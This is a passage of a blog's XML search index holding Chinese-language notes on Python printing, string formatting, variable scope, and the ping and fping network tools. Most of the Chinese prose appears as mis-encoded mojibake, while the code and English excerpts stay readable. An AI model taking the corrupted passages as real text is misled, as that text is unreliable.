class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Violetu&quot;</span>, <span class="string">&quot;sex&quot;</span>: <span class="string">&quot;male&quot;</span>&#125;, sep=<span class="string">&quot;\n&quot;</span>, end=<span class="string">&quot;\nThis is the end!\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>*<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    filename = <span class="string">&quot;test.txt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        my_print(<span class="string">f&quot;I&#x27;m the text written to <span class="subst">&#123;filename&#125;</span>&quot;</span>, file=fp)</span><br><span class="line"></span><br><span class="line">    os.system(<span class="string">f&quot;cat <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="https://stackoverflow.com/questions/42762120/sys-stdout-as-default-function-argument">sys.stdoutas default function argument</a></li><li><ahref="https://stackoverflow.com/questions/51802974/if-else-vs-or-operation-for-none-check">if-elsevs â€œorâ€ operation for None-check</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fun </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python format æ ¼å¼åŒ–è¾“å‡º</title>
      <link href="/blog/2020/07/21/programming/python/1.basic/2.format_output/"/>
      <url>/blog/2020/07/21/programming/python/1.basic/2.format_output/</url>
      
        <content type="html"><![CDATA[<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‡½æ•° <code>str.format()</code> ä¸ <code>f-string</code>çš„æ ¼å¼å‡ ä¹ä¸€è‡´ï¼Œå› æ­¤æˆ‘æŠŠå®ƒæ”¾åœ¨ä¸€èµ·å­¦ä¹ ä¸è®°å½•ã€‚</p><h2 id="member-and-element-access">Member and Element Access</h2><p>format å‡½æ•°å¯ä»¥æ¥å—ä¸é™ä¸ªå‚æ•°ï¼Œä½ç½®å¯ä»¥ä¸æŒ‰é¡ºåºã€‚</p><ol type="1"><li><p>ä¸è®¾ç½®æŒ‡å®šä½ç½®åºå·ï¼Œ åˆ™æŒ‰é»˜è®¤é¡ºåºè®¿é—®</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">14</span>]: <span class="string">&quot;&#123;&#125;, &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>)</span><br><span class="line">Out[<span class="number">14</span>]: <span class="string">&#x27;hello, world&#x27;</span></span><br></pre></td></tr></table></figure></p></li><li><p>æŒ‡å®šä½ç½®åºå·ï¼Œåˆ™æŒ‰ç…§æŒ‡å®šçš„é¡ºåºè®¿é—®</p><p>å¯¹ format()æ‹¬å·ä¸­çš„å‚æ•°ç¼–å·ï¼Œç„¶åå‰é¢å­—ç¬¦ä¸²éœ€è¦å“ªä¸ªä½ç½®çš„ï¼Œä¾¿å¡«å†™å¯¹åº”åºå·ã€‚</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">16</span>]: <span class="string">&quot;&#123;1&#125;, &#123;0&#125;, &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;value_0&quot;</span>, <span class="string">&quot;value_1&quot;</span>)</span><br><span class="line">Out[<span class="number">16</span>]: <span class="string">&#x27;value_1, value_0, value_1&#x27;</span></span><br></pre></td></tr></table></figure></p></li><li><p>é€šè¿‡åå­—è®¿é—®</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">17</span>]: name = <span class="string">&quot;Violetu&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">18</span>]: sex=<span class="string">&quot;male&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">19</span>]: <span class="string">&quot;&#123;sex&#125;, &#123;name&#125;&quot;</span>.<span class="built_in">format</span>(name=name, sex=sex)</span><br><span class="line">Out[<span class="number">19</span>]: <span class="string">&#x27;male, Violetu&#x27;</span></span><br></pre></td></tr></table></figure></p></li><li><p>é€šè¿‡ç´¢å¼•è®¿é—®</p><p>è¿™é‡Œçš„ <code>0[0]</code> æ˜¯æŒ‡ç¬¬é›¶ä¸ªå…ƒç´ ï¼ˆpersonï¼‰çš„ç´¢å¼• 0 ä½ç½®ã€‚</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">20</span>]: person = [<span class="string">&quot;Violetu&quot;</span>, <span class="string">&quot;male&quot;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">21</span>]: <span class="string">&quot;name: &#123;0[0]&#125;, sex: &#123;0[1]&#125;&quot;</span>.<span class="built_in">format</span>(person)</span><br><span class="line">Out[<span class="number">21</span>]: <span class="string">&#x27;name: Violetu, sex: male&#x27;</span></span><br></pre></td></tr></table></figure></p><p>æ³¨ï¼š è¿™é‡Œçš„ 0 ä¸å¯ä»¥çœç•¥ã€‚</p></li><li><p>é€šè¿‡å±æ€§è®¿é—®</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">28</span>]: <span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    ...:     <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">    ...:         self.value = value</span><br><span class="line">    ...: my_value = test(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">29</span>]: <span class="string">&quot;value is &#123;0.value&#125;&quot;</span>.<span class="built_in">format</span>(my_value)</span><br><span class="line">Out[<span class="number">29</span>]: <span class="string">&#x27;value is 6&#x27;</span></span><br></pre></td></tr></table></figure></p></li><li><p>é€šè¿‡é”®å€¼è®¿é—®</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">42</span>]: <span class="string">&quot;name: &#123;name&#125;, sex: &#123;sex&#125;&quot;</span>.<span class="built_in">format</span>(**person_dict)</span><br><span class="line">Out[<span class="number">42</span>]: <span class="string">&#x27;name: Violetu, sex: male&#x27;</span></span><br></pre></td></tr></table></figure></p></li></ol><h2 id="numerical-representation">Numerical Representation</h2><table><colgroup><col style="width: 29%" /><col style="width: 70%" /></colgroup><thead><tr class="header"><th style="text-align: left;"><code>'&#123;:x&#125;'.format(100)</code></th><th style="text-align: left;">Hexadecimal representationOutput:<code>64</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: left;"><code>'&#123;:X&#125;'.format(3487)</code></td><td style="text-align: left;">Hexadecimal representation (uppercaseletters) <br>Output: <code>D9F</code></td></tr><tr class="even"><td style="text-align: left;"><code>'&#123;:#x&#125;'.format(100)</code></td><td style="text-align: left;">Hexadecimal representation (including the<code>0x</code>) <br>Output: <code>0x64</code></td></tr><tr class="odd"><td style="text-align: left;"><code>'&#123;:b&#125;'.format(100)</code></td><td style="text-align: left;">Binary representation <br>Output:<code>1100100</code></td></tr><tr class="even"><td style="text-align: left;"><code>'&#123;:c&#125;'.format(100)</code></td><td style="text-align: left;">Character representation <br>Output:<code>d</code></td></tr><tr class="odd"><td style="text-align: left;"><code>'&#123;:d&#125;'.format(100)</code></td><td style="text-align: left;">Decimal representation (default)<br>Output: <code>100</code></td></tr><tr class="even"><td style="text-align: left;"><code>'&#123;:,&#125;'.format(1000000)</code></td><td style="text-align: left;">With thousands separator <br>Output:<code>1,000,000</code></td></tr><tr class="odd"><td style="text-align: left;"><code>'&#123;:o&#125;'.format(100)</code></td><td style="text-align: left;">Octal representation <br>Output:<code>144</code></td></tr><tr class="even"><td style="text-align: left;"><code>'&#123;:n&#125;'.format(100)</code></td><td style="text-align: left;">Like <code>d</code>, but uses localeinformation for separators <br>Output: <code>100</code></td></tr><tr class="odd"><tdstyle="text-align: left;"><code>'&#123;:e&#125;'.format(0.0000000001)</code></td><td style="text-align: left;">Exponent notation <br>Output:<code>1.000000e-10</code></td></tr><tr class="even"><tdstyle="text-align: left;"><code>'&#123;:E&#125;'.format(0.0000000001)</code></td><td style="text-align: left;">Exponent notation (capital 'E')<br>Output: <code>1.000000E-10</code></td></tr><tr class="odd"><td style="text-align: left;"><code>'&#123;:f&#125;'.format(3/14.0)</code></td><td style="text-align: left;">Fixed point <br>Output:<code>0.214286</code></td></tr><tr class="even"><td style="text-align: left;"><code>'&#123;:g&#125;'.format(3/14.0)</code></td><td style="text-align: left;">General format <br>Output:<code>0.214286</code></td></tr><tr class="odd"><td style="text-align: left;"><code>'&#123;:%&#125;'.format(0.66)</code></td><td style="text-align: left;">Percentage <br>Output:<code>66.000000%</code></td></tr><tr class="even"><td style="text-align: left;"><code>'&#123;:.3&#125;'.format(0.214286)</code></td><td style="text-align: left;">Precision <br>Output:<code>0.214</code></td></tr></tbody></table><h2 id="field-width-and-alignment">Field Width and Alignment</h2><p><code>&#123;number&#125;:&#123;padding&#125;&#123;align&#125;&#123;+&#125;&#123;width&#125;&#123;type&#125;</code></p><h2 id="æ•´æ•°-typed">æ•´æ•° type=d</h2><ol type="1"><li>padding character:å†’å·åé¢ï¼Œå¯¹é½ç¬¦å·å‰è¾¹å†™ï¼Œåªèƒ½æ˜¯ä¸€ä¸ªå­—ç¬¦ï¼Œä¸æŒ‡å®šåˆ™é»˜è®¤æ˜¯ç”¨ç©ºæ ¼å¡«å……ã€‚</li><li>align symbolï¼š <code>^</code>, <code>&lt;</code>, <code>&gt;</code>åˆ†åˆ«æ˜¯å±…ä¸­ã€å·¦å¯¹é½ã€å³å¯¹é½ï¼Œ é»˜è®¤æ˜¯å³å¯¹é½ã€‚</li><li><code>+</code>: è¡¨ç¤ºåœ¨æ­£æ•°å‰æ˜¾ç¤º +ï¼Œè´Ÿæ•°å‰æ˜¾ç¤º -ï¼›Â ï¼ˆç©ºæ ¼ï¼‰è¡¨ç¤ºåœ¨æ­£æ•°å‰åŠ ç©ºæ ¼</li><li>widthï¼šå®½åº¦ï¼Œåªæœ‰å®½åº¦å¤§äºæ•°å­—å®½åº¦äº‹ï¼Œå¯¹é½æ‰æœ‰æ„ä¹‰ã€‚</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">66</span>]: <span class="string">f&quot;<span class="subst">&#123;<span class="number">3</span>:5d&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">66</span>]: <span class="string">&#x27;    3&#x27;</span></span><br><span class="line">In [<span class="number">65</span>]: <span class="string">f&quot;<span class="subst">&#123;<span class="number">3</span>:&lt;5d&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">65</span>]: <span class="string">&#x27;3    &#x27;</span></span><br><span class="line">In [<span class="number">63</span>]: <span class="string">f&quot;<span class="subst">&#123;<span class="number">3</span>:x&lt;5d&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">63</span>]: <span class="string">&#x27;3xxxx&#x27;</span></span><br><span class="line"><span class="comment"># è¿™ä¸ªä¸ºæ•°å­— 3, å·¦å¯¹é½ï¼Œ å®½åº¦ä¸º 5ï¼Œ å¡«å……å­—ç¬¦ `x`ã€‚</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">In [<span class="number">76</span>]: <span class="string">f&quot;<span class="subst">&#123;-<span class="number">3</span>:+8d&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">76</span>]: <span class="string">&#x27;      -3&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">82</span>]: <span class="string">f&quot;<span class="subst">&#123;<span class="number">3</span>:<span class="number">0</span>&lt;+8d&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">82</span>]: <span class="string">&#x27;+3000000&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">78</span>]: <span class="string">f&quot;<span class="subst">&#123;-<span class="number">3</span>:-8d&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">78</span>]: <span class="string">&#x27;      -3&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²-type-ä¸ºç©º">å­—ç¬¦ä¸² type ä¸ºç©º</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">83</span>]: <span class="string">&#x27;&#123;:*^15&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;text&#x27;</span>)</span><br><span class="line">Out[<span class="number">83</span>]: <span class="string">&#x27;*****text******&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="å°æ•°-typef">å°æ•° type=f</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">86</span>]: <span class="string">f&quot;<span class="subst">&#123;<span class="number">3.14159</span>:x&gt;+<span class="number">10.2</span>f&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">86</span>]: <span class="string">&#x27;xxxxx+3.14&#x27;</span></span><br></pre></td></tr></table></figure><p>è§£é‡Šï¼šå¸¦ç¬¦å·ï¼Œå®½åº¦ä¸º 10ï¼Œ å³å¯¹é½ï¼Œå¡«å…… <code>x</code>ï¼Œä¿ç•™ä¸¤ä½å°æ•°ã€‚</p><h2 id="conversions">Conversions</h2><table><colgroup><col style="width: 37%" /><col style="width: 62%" /></colgroup><thead><tr class="header"><th><code>'&#123;!r&#125;'.format('string')</code></th><th>Calling <code>repr</code> on argumentsOutput:<code>'string'</code></th></tr></thead><tbody><tr class="odd"><td><code>'&#123;!s&#125;'.format(1.53438987)</code></td><td>Calling <code>str</code> on arguments</td></tr></tbody></table><h2 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h2><blockquote><ol type="1"><li><ahref="https://kapeli.com/cheat_sheets/Python_Format_Strings.docset/Contents/Resources/Documents/index">PythonFormat Strings</a></li><li><ahref="https://www.runoob.com/python/att-string-format.html">Pythonformat æ ¼å¼åŒ–å‡½æ•°</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å±€éƒ¨å˜é‡ä¸å…¨å±€å˜é‡</title>
      <link href="/blog/2020/07/20/programming/python/1.basic/5.para_gl_local/"/>
      <url>/blog/2020/07/20/programming/python/1.basic/5.para_gl_local/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»‹ç»">ä»‹ç»</h2><p>å…¨å±€å˜é‡æ˜¯åœ¨å‡½æ•°å¤–éƒ¨å®šä¹‰çš„å˜é‡ï¼Œæ‰€æœ‰å‡½æ•°å†…éƒ¨éƒ½å¯ä»¥ä½¿ç”¨è¿™ä¸ªå˜é‡ã€‚æ³¨æ„ï¼šå‡½æ•°æ‰§è¡Œæ—¶ï¼Œéœ€è¦å¤„ç†å˜é‡æ—¶ä¼š:</p><ol type="1"><li>é¦–å…ˆæŸ¥æ‰¾<strong>å‡½æ•°å†…éƒ¨</strong>æ˜¯å¦å­˜åœ¨æŒ‡å®šåç§°çš„å±€éƒ¨å˜é‡ï¼Œå¦‚æœæœ‰ï¼Œç›´æ¥ä½¿ç”¨ã€‚</li><li>å¦‚æœæ²¡æœ‰ï¼ŒæŸ¥æ‰¾å‡½æ•°å¤–éƒ¨æ˜¯å¦å­˜åœ¨æŒ‡å®šåç§°çš„<strong>å…¨å±€å˜é‡</strong>ï¼Œå¦‚æœæœ‰ï¼Œç›´æ¥ä½¿ç”¨ã€‚</li><li>å¦‚æœæ²¡æœ‰ï¼Œç¨‹åºæŠ¥é”™ã€‚</li></ol><h3 id="æ³¨æ„äº‹é¡¹">æ³¨æ„äº‹é¡¹</h3><ol type="1"><li><p>å‡½æ•°ä¸èƒ½ç›´æ¥ä¿®æ”¹å…¨å±€å˜é‡çš„å¼•ç”¨ï¼Œå¦‚æœç›´æ¥ä½¿ç”¨èµ‹å€¼è¯­å¥ï¼Œä¼šåœ¨å‡½æ•°å†…éƒ¨ï¼Œå®šä¹‰ä¸€ä¸ªå±€éƒ¨å˜é‡ã€‚</p><ul><li><p>å…¨å±€å˜é‡æ˜¯åœ¨å‡½æ•°å¤–éƒ¨å®šä¹‰çš„å˜é‡(æ²¡æœ‰å®šä¹‰åœ¨æŸä¸€ä¸ªå‡½æ•°å†…)ï¼Œæ‰€æœ‰å‡½æ•°å†…éƒ¨éƒ½å¯ä»¥è¯»å–è¿™ä¸ªå˜é‡</p><blockquote><p>æç¤ºï¼šåœ¨å…¶ä»–ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œå¤§å¤šä¸æ¨èä½¿ç”¨å…¨å±€å˜é‡ --å¯å˜èŒƒå›´å¤ªå¤§ï¼Œå¯¼è‡´ç¨‹åºä¸å¥½ç»´æŠ¤ã€‚ ä½†æ˜¯åœ¨ Pythonä¸­ä½¿ç”¨å…¨å±€å˜é‡çš„åœºæ™¯è¿˜æ˜¯å¾ˆè¾ƒå¤šçš„ã€‚</p></blockquote></li><li><p>åœ¨å‡½æ•°å†…éƒ¨ï¼Œå¯ä»¥é€šè¿‡å…¨å±€å˜é‡çš„å¯¹è±¡å¼•ç”¨è·å–å¯¹åº”çš„æ•°æ®ã€‚</p></li><li><p>ä½†æ˜¯ï¼Œå¯¹äºä¸å¯å˜å¯¹è±¡æ¥è¯´ï¼Œä¸å…è®¸ä½¿ç”¨èµ‹å€¼è¯­å¥ä¿®æ”¹å…¶å¯¹è±¡å¼•ç”¨(å¯å˜å¯¹è±¡è¿˜æ˜¯å¯ä»¥ä¿®æ”¹å…ƒç´ çš„ï¼Œä½†ä¹Ÿä¸å…è®¸ä¿®æ”¹å…¶å¯¹è±¡å¼•ç”¨)</p></li></ul></li><li><p>åœ¨å‡½æ•°å†…éƒ¨ä¿®æ”¹å…¨å±€å˜é‡çš„å€¼å¦‚æœåªæ˜¯åœ¨å‡½æ•°å†…éƒ¨è®¿é—®å…¨å±€å˜é‡ï¼Œå¯ä»¥ç›´æ¥è®¿é—®ï¼Œä½†æ˜¯å¦‚æœè¦ä¿®æ”¹å…¨å±€å˜é‡ï¼Œéœ€è¦ä½¿ç”¨ <code>global å…¨å±€å˜é‡å</code> æå‰å£°æ˜ï¼Œç„¶åæ‰èƒ½ä¿®æ”¹ã€‚</p><ul><li>æ³¨æ„åœ¨å¼€å‘æ—¶ï¼Œåº”è¯¥æŠŠæ¨¡å—ä¸­çš„æ‰€æœ‰å…¨å±€å˜é‡å®šä¹‰åœ¨å‡½æ•°ä¸Šæ–¹ï¼Œè¿™æ ·å°±å¯ä»¥ä¿è¯æ‰€æœ‰å‡½æ•°éƒ½èƒ½å¤Ÿæ­£å¸¸è®¿é—®åˆ°æ¯ä¸€ä¸ªå…¨å±€å˜é‡äº†</li></ul></li><li><p>å…¨å±€å˜é‡å‘½åçš„å»ºè®®</p><ul><li>ä¸ºäº†é¿å…å±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡å‡ºç°æ··æ·†ï¼Œåœ¨å®šä¹‰å…¨å±€å˜é‡æ—¶ï¼Œæœ‰äº›å…¬å¸ä¼šæœ‰ä¸€äº›å¼€å‘è¦æ±‚ï¼Œä¾‹å¦‚:å…¨å±€å˜é‡åå‰åº”è¯¥å¢åŠ  <code>g_</code> æˆ–è€… 'gl_' çš„å‰ç¼€ &gt; æç¤º:å…·ä½“çš„è¦æ±‚æ ¼å¼ï¼Œå„å…¬å¸è¦æ±‚å¯èƒ½ä¼šæœ‰äº›å·®å¼‚ã€‚</li></ul></li><li><p>å¦‚æœå±€éƒ¨å˜é‡çš„åå­—å’Œå…¨å±€å˜é‡çš„åå­—ç›¸åŒï¼ŒPycharmä¼šåœ¨å±€éƒ¨å˜é‡ä¸‹æ–¹æ˜¾ç¤ºä¸€ä¸ªç°è‰²çš„è™šçº¿ã€‚</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ping ä¸ fping</title>
      <link href="/blog/2020/07/18/linux/tools/f_ping/"/>
      <url>/blog/2020/07/18/linux/tools/f_ping/</url>
      
        <content type="html"><![CDATA[<h2 id="ping">ping</h2><h3 id="ç®€ä»‹">ç®€ä»‹</h3><p><code>info ping</code> å¯å¾—ï¼š</p><blockquote><p>'ping' uses ICMP datagrams to provoke a response from the chosendestination host, <strong>mainly intending to probe whether it isalive</strong>.</p><p>The used datagram, of type 'ECHO_REQUEST', contains some headerinformation and some additional payload, usually a timestamp. By asuitable choice of payload, different host or router properties aredetectable, as the emitted datagram travels to its destination.</p></blockquote><h3 id="å‘½ä»¤">å‘½ä»¤</h3><p>é€šè¿‡ <code>ping --help</code> æˆ‘å­¦åˆ°å‡ ä¸ªæœ‰ç”¨çš„é€‰é¡¹ï¼š</p><p><code>ping [options] &lt;destination&gt;</code></p><ol type="1"><li><code>&lt;destination&gt;</code> dns name or ip address</li><li><code>-c &lt;count&gt;</code> stop after <code>&lt;count&gt;</code>replies</li><li><code>-i &lt;interval&gt;</code> seconds between sending eachpacket</li><li><code>-w &lt;deadline&gt;</code> reply wait<code>&lt;deadline&gt;</code> in seconds</li><li><code>-f &lt;deadline&gt;</code> flood ping</li></ol><h2 id="fping">fping</h2><h3 id="ç®€ä»‹-1">ç®€ä»‹</h3><p><code>man ping</code> å¯å¾—ï¼š</p><blockquote><p>fping is a program like ping which uses the Internet Control MessageProtocol (ICMP) echo request to determine if a target host isresponding.</p><p>fping differs from ping in that you can specify any number of targetson the command line, or specify a file containing the lists of targetsto ping. Instead of sending to one target until it times out or replies,fping will send out a ping packet and move on to the next target in a<strong>round-robin</strong> fashion.</p><p>In the default mode, if a target replies, it is noted and removedfrom the list of targets to check; if a target does not respond within acertain time limit and/or retry limit it is designated asunreachable.</p><p>fping also supports sending a specified number of pings to a target,or looping indefinitely (as in ping ). Unlike ping, <strong>fping ismeant to be used in scripts</strong>, so its output is designed to beeasy to parse.</p></blockquote><h3 id="å‘½ä»¤-1">å‘½ä»¤</h3><p>é€šè¿‡ <code>man ping</code> æˆ‘å­¦åˆ°å‡ ä¸ªæœ‰ç”¨çš„é€‰é¡¹ï¼š</p><ol type="1"><li><p><code>-a, --alive</code> Show systems that are alive.</p></li><li><p><code>-f, --file</code> Read list of targets from a file. Thisoption can only be used by the root user. Regular users should pipe inthe file via stdin: <code>fping &lt; targets_file</code></p></li><li><p><code>-g, --generate addr/mask</code> Generate a target list froma supplied IP netmask, or a starting and ending IP. Specify the netmaskor start/end in the targets portion of the command line. If a networkwith netmask is given, the network and broadcast addresses will beexcluded. ex. To ping the network 192.168.1.0/24, the specified commandline could look like either: <code>fping -g 192.168.1.0/24</code> or<code>fping -g 192.168.1.1 192.168.1.254</code></p></li><li><p><code>-s, --src</code> Print cumulative statistics uponexit.</p></li></ol><p>ç»ƒä¹ ï¼ˆæˆ‘çš„å†…ç½‘ IP ä¸º <code>192.168.43.79</code>ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">fping -s 192.168.43.76 192.168.43.79</span></span><br><span class="line">192.168.43.79 is alive</span><br><span class="line">ICMP Host Unreachable from 192.168.43.79 for ICMP Echo sent to 192.168.43.76</span><br><span class="line">ICMP Host Unreachable from 192.168.43.79 for ICMP Echo sent to 192.168.43.76</span><br><span class="line">ICMP Host Unreachable from 192.168.43.79 for ICMP Echo sent to 192.168.43.76</span><br><span class="line">ICMP Host Unreachable from 192.168.43.79 for ICMP Echo sent to 192.168.43.76</span><br><span class="line">192.168.43.76 is unreachable</span><br><span class="line"></span><br><span class="line">       2 targets</span><br><span class="line">       1 alive</span><br><span class="line">       1 unreachable</span><br><span class="line">       0 unknown addresses</span><br><span class="line"></span><br><span class="line">       1 timeouts (waiting for response)</span><br><span class="line">       5 ICMP Echos sent</span><br><span class="line">       1 ICMP Echo Replies received</span><br><span class="line">       4 other ICMP received</span><br><span class="line"></span><br><span class="line"> 0.05 ms (min round trip time)</span><br><span class="line"> 0.05 ms (avg round trip time)</span><br><span class="line"> 0.05 ms (max round trip time)</span><br><span class="line">        4.076 sec (elapsed real time)</span><br></pre></td></tr></table></figure><p>shell ä¸Šæ˜¾ç¤ºå››éƒ¨åˆ†ï¼š</p><ol type="1"><li><p>å­˜æ´»ä¸»æœº <code>192.168.43.79 is alive</code>ï¼›</p></li><li><p>ICMP å·®é”™æŠ¥æ–‡ï¼Œ <strong>æ ‡å‡†é”™è¯¯è¾“å‡ºä¿¡æ¯</strong>ï¼Œå¯ä»¥ç”¨<code>2&gt;/dev/null</code> å»é™¤ï¼›</p><p>æ¯ä¸ªåœ°å€æœ€å¤šè¯¢é—® å››æ¬¡</p></li><li><p>ä¸å¯è¾¾ä¸»æœºï¼š<code>192.168.43.76 is unreachable</code><code>-a</code> é€‰é¡¹ä¾¿æ˜¯å»é™¤è¿™ä¸€éƒ¨åˆ†</p></li><li><p>ç´¯è®¡æ•°æ® <code>-s</code>é€‰é¡¹çš„ä½œç”¨ä¾¿æ˜¯åœ¨é€€å‡ºå‰ï¼Œè¾“å‡ºç´¯è®¡ç»Ÿè®¡æ•°æ®ã€‚</p></li></ol><p><code>-g</code> é€‰é¡¹ï¼Œæ ¹æ®èµ·ã€å§‹ IP ç”Ÿæˆåˆ—è¡¨ï¼Œéå†ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">fping -g 192.168.43.76 192.168.43.79 2&gt;/dev/null</span></span><br><span class="line">192.168.43.79 is alive</span><br><span class="line">192.168.43.76 is unreachable</span><br><span class="line">192.168.43.77 is unreachable</span><br><span class="line">192.168.43.78 is unreachable</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨ï¼š<code>fping -ag IP æˆ–èµ·å§‹IP 2&gt;/dev/null</code></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ping </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®é“¾è·¯å±‚å®‰å…¨å¨èƒ</title>
      <link href="/blog/2020/07/17/network/link_sec/"/>
      <url>/blog/2020/07/17/network/link_sec/</url>
      
